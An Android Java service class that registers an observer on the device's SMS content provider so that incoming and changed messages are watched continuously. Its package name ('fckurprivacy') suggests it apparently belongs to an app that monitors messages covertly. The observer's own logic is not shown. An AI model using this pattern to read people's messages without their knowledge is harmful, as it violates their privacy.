package com.vergermiya.harevost.fckurprivacy.SmsChecker;

import android.app.Service;
import android.content.Intent;
import android.net.Uri;
import android.os.Handler;
import android.os.IBinder;

public class SmsCheckService extends Service {

    private SmsObserver mSmsObserver;

    public SmsCheckService() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startSmsCheckService();
        return START_REDELIVER_INTENT;
    }

    public void startSmsCheckService() {
        mSmsObserver = new SmsObserver(this, new Handler());
        getContentResolver().registerContentObserver(Uri.parse("content://sms/"), true, mSmsObserver);
    }

}
